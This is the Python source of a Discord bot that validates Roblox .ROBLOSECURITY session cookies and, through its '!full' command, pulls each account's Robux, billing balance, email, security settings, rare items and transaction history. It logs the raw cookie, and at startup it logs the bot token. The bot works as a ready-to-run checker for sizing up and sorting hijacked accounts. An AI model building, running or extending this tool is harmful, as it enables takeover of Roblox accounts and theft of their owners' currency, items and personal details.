import os
import discord
from discord import Activity, ActivityType, Embed, Intents
from requests import get
from discord.ext import commands
from datetime import datetime
from time import time as __, sleep as zzz
from re import findall
from keepalive import keep_alive  # Import the keep_alive function

def log(text, sleep=None): 
    print(f"[{datetime.utcfromtimestamp(__()).strftime('%Y-%m-%d %H:%M:%S')}] → {text}")
    if sleep: zzz(sleep)

class settings:
    token = os.getenv('DISCORD_BOT_TOKEN')  # Use environment variable for the bot token
    prefix = '!'  # Bot Prefix
    bot_status = '@saikitite Prefix: !'  # Bot Status
    intents = Intents.default()
    intents.message_content = True  # ✅ Fix: Allow bot to read messages
    client = commands.Bot(command_prefix=prefix, intents=intents)

log(f'Detected token: {settings.token}', 0.5)
log(f'Detected prefix: {settings.prefix}', 0.5)
log(f'Detected bot status: {settings.bot_status}', 0.5)

@settings.client.event
async def on_ready():
    log(f"Connected to {settings.client.user}", 0.5)
    await settings.client.change_presence(activity=Activity(type=ActivityType.watching, name=settings.bot_status))



@settings.client.command()
async def vc(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=Embed(title=":x: Missing Cookie", color=0xFF0000))
        log(f'User {ctx.author} tried to use {settings.prefix}vc but did not provide a cookie.')
        return

    await ctx.message.delete()
    headers = {"User-Agent": "Mozilla/5.0"}  # ✅ Fix: Add User-Agent header
    response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie}, headers=headers)

    if response.status_code == 200 and '"id":' in response.text:
        log(f'User {ctx.author} used {settings.prefix}vc with a valid cookie.')
        embedVar = Embed(title=":white_check_mark: Valid Cookie", color=0x38d13b)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        embedVar.set_footer(text="Check your DMs for the cookie.")
        dm = await ctx.author.create_dm()
        await dm.send(embed=Embed(title=":white_check_mark: Cookie", description=f'```{cookie}```', color=0x38d13b))
        await ctx.send(embed=embedVar)
    elif response.status_code == 401:  # ✅ Fix: Check for 401 Unauthorized response
        log(f'User {ctx.author} used {settings.prefix}vc with an invalid cookie.')
        embedVar = Embed(title=":x: Invalid Cookie", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        log(f'User {ctx.author} used {settings.prefix}vc but Roblox returned an error.')
        embedVar = Embed(title=":x: Error", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value=f'```{response.text}```', inline=False)
        await ctx.send(embed=embedVar)

@settings.client.command()
async def vcr(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=Embed(title=":x: Missing Cookie", color=0xFF0000))
        log(f'User {ctx.author} tried to use {settings.prefix}vcr but did not provide a cookie.')
        return

    await ctx.message.delete()
    headers = {"User-Agent": "Mozilla/5.0"}  # ✅ Fix: Add User-Agent header
    response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie}, headers=headers)

    if response.status_code == 200 and '"id":' in response.text:
        log(f'User {ctx.author} used {settings.prefix}vcr with a valid cookie.')
        user_id = response.json().get('id', None)
        if user_id:
            robux_response = get(f'https://economy.roblox.com/v1/users/{user_id}/currency', cookies={'.ROBLOSECURITY': cookie}, headers=headers)
            if robux_response.status_code == 200:
                robux = robux_response.json().get('robux', 0)
                embedVar = Embed(title=":white_check_mark: Valid Cookie", color=0x38d13b)
                embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
                embedVar.add_field(name=":money_mouth: Robux", value=str(robux), inline=True)
                dm = await ctx.author.create_dm()
                await dm.send(embed=Embed(title=":white_check_mark: Cookie", description=f'```{cookie}```', color=0x38d13b))
                await ctx.send(embed=embedVar)
            else:
                embedVar = Embed(title=":x: Failed to retrieve Robux", color=0xFF0000)
                await ctx.send(embed=embedVar)
        else:
            embedVar = Embed(title=":x: Failed to retrieve user ID", color=0xFF0000)
            await ctx.send(embed=embedVar)
    elif response.status_code == 401:  # ✅ Fix: Check for 401 Unauthorized response
        log(f'User {ctx.author} used {settings.prefix}vcr with an invalid cookie.')
        embedVar = Embed(title=":x: Invalid Cookie", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        log(f'User {ctx.author} used {settings.prefix}vcr but Roblox returned an error.')
        embedVar = Embed(title=":x: Error", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value=f'```{response.text}```', inline=False)
        await ctx.send(embed=embedVar)

@settings.client.command()
async def full(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=Embed(title=":x: Missing Cookie", description="Please provide a valid `.ROBLOSECURITY` cookie.", color=0xFF0000))
        return

    await ctx.message.delete()
    headers = {"User-Agent": "Mozilla/5.0"}
    hidden = '```                       Hidden                  ```'

    # Fetch authenticated user data
    response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
    hidden = '``` Hidden ```'

    if '"id":' in response.text:
        user_id = response.json()['id']
        robux = get(f'https://economy.roblox.com/v1/users/{user_id}/currency', cookies={'.ROBLOSECURITY': cookie}).json()['robux']
        balance_credit_info = get(f'https://billing.roblox.com/v1/credit', cookies={'.ROBLOSECURITY': cookie})
        balance_credit_currency = balance_credit_info.json()['currencyCode']
        account_settings = get(f'https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY': cookie})

        # Print the account settings response for debugging
        log(f"Account Settings Response: {account_settings.json()}")

        account_name = account_settings.json().get('Name', 'N/A')
        account_display_name = account_settings.json().get('DisplayName', 'N/A')
        account_email_verified = account_settings.json().get('IsEmailVerified', False)
        user_email = account_settings.json().get('UserEmail', 'N/A')  # Use .get() to avoid KeyError

        if account_email_verified:
            account_email_verified = f'True (`{user_email}`)'
        else:
            account_email_verified = 'False'

        account_above_13 = account_settings.json().get('UserAbove13', 'N/A')
        account_age_in_years = round(float(account_settings.json().get('AccountAgeInDays', 0) / 365), 2)
        account_has_premium = account_settings.json().get('IsPremium', False)
        account_has_pin = account_settings.json().get('IsAccountPinEnabled', False)
        account_2step = account_settings.json().get('MyAccountSecurityModel', {}).get('IsTwoStepEnabled', False)

        # Check for specific items in the user's inventory
        check_korblox = get(f"https://inventory.roblox.com/v1/users/{user_id}/items/0/139610147")
        korblox_checker = "True" if (check_korblox.json().get('data') and len(check_korblox.json()['data']) > 0) else "False"

        check_headless = get(f"https://inventory.roblox.com/v1/users/{user_id}/items/3/201")
        headless_checker = "True" if (check_headless.json().get('data') and len(check_headless.json()['data']) > 0) else "False"

        check_valkyrie = get(f"https://inventory.roblox.com/v1/users/{user_id}/items/0/1365767")
        valkyrie_checker = "True" if (check_valkyrie.json().get('data') and len(check_valkyrie.json()['data']) > 0) else "False"

        # Prepare the embed response
        embedVar = Embed(title=":white_check_mark: ROBLOX COOKIE", description="", color=0x38d13b)
        embedVar.add_field(name="SUCCESS CHECKED: ", value=hidden, inline=False)
        embedVar.add_field(name=":money_mouth: Robux", value=robux, inline=True)
        embedVar.add_field(name=":moneybag: Balance", value=f'{balance_credit_info.json().get("balance", "N/A")} {balance_credit_currency}', inline=True)
        embedVar.add_field(name=":bust_in_silhouette: Account Name", value=f'{account_name} ({account_display_name})', inline=True)
        embedVar.add_field(name=":email: Email Verified", value=account_email_verified, inline=True)
        embedVar.add_field(name=":calendar: Account Age", value=f'{account_age_in_years} years', inline=True)
        embedVar.add_field(name=":baby: Above 13", value=account_above_13, inline=True)
        embedVar.add_field(name=":star: Premium", value=account_has_premium, inline=True)
        embedVar.add_field(name=":key: Has Korblox", value=korblox_checker, inline=True)
        embedVar.add_field(name=":headphones: Has Headless", value=headless_checker, inline=True)
        embedVar.add_field(name=":trophy: Has Valkyrie", value=valkyrie_checker, inline=True)
        embedVar.add_field(name=":key: Has PIN", value=account_has_pin, inline=True)
        embedVar.add_field(name=":lock: 2-Step Verification", value=account_2step, inline=True)

        account_friends = get('https://friends.roblox.com/v1/my/friends/count', cookies={'.ROBLOSECURITY': cookie}).json()['count']
        account_voice_verified = get('https://voice.roblox.com/v1/settings', cookies={'.ROBLOSECURITY': cookie}).json()['isVerifiedForVoice']

        # Check for gamepasses and badges
        account_gamepasses = get(f'https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId={user_id}', cookies={'.ROBLOSECURITY': cookie})
        check = findall(r'"PriceInRobux":(.*?),', account_gamepasses.text)
        account_gamepasses_value = str(sum([int(match) if match != "null" else 0 for match in check])) + f' R$'

        account_badges = ', '.join(list(findall(r'"name":"(.*?)"', get(f'https://accountinformation.roblox.com/v1/users/{user_id}/roblox-badges', cookies={'.ROBLOSECURITY': cookie}).text)))

        # Prepare transaction details
        account_transactions = get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary', cookies={'.ROBLOSECURITY': cookie}).json()
        account_sales_of_goods = account_transactions['salesTotal']
        account_purchases_total = abs(int(account_transactions['purchasesTotal']))
        account_commissions = account_transactions['affiliateSalesTotal']
        account_robux_purchased = account_transactions['currencyPurchasesTotal']
        account_premium_payouts_total = account_transactions['premiumPayoutsTotal']
        account_pending_robux = account_transactions['pendingRobuxTotal']

        # Add fields to the embed
        embedVar.add_field(name=":video_game: Gamepasses Worth", value=account_gamepasses_value, inline=True)
        embedVar.add_field(name=":medal: Badges", value=account_badges, inline=True)
        embedVar.add_field(name="**↻** Transactions", value=f':small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ', inline=False)
        embedVar.add_field(name=":coin: Sales of Goods", value=account_sales_of_goods, inline=True)
        embedVar.add_field(name="💰 Premium Payouts", value=account_premium_payouts_total, inline=True)
        embedVar.add_field(name="📈 Commissions", value=account_commissions, inline=True)
        embedVar.add_field(name=":credit_card: Robux purchased", value=account_robux_purchased, inline=True)
        embedVar.add_field(name="🚧 Pending", value=account_pending_robux, inline=True)
        embedVar.add_field(name=":money_with_wings: Overall", value=account_purchases_total, inline=True)

        embedVar.set_thumbnail(url=get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}').json()['data'][0]['imageUrl'])

        # Send the embed to the original context
        await ctx.send(embed=embedVar)

        # Create a DM channel with the user who invoked the command
        dm = await ctx.author.create_dm()
        await dm.send(embed=embedVar)

        # Log the user action
        log(f'User {ctx.author} used /full with a valid cookie. [{robux} R$ | {balance_credit_info.json().get("balance", "N/A")} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses_value} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')

    elif 'Unauthorized' in response.text:
        log(f'User {ctx.author} used /full with an invalid cookie.')
        embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='``` Hidden ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        log(f'User {ctx.author} used /full but Roblox returned a bad response.')
        embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value='```' + response.text + '```', inline=False)
        await ctx.send(embed=embedVar)

def run_bot():
    settings.client.run(settings.token)

# Start the keep-alive server
keep_alive()

# Start the bot
run_bot()
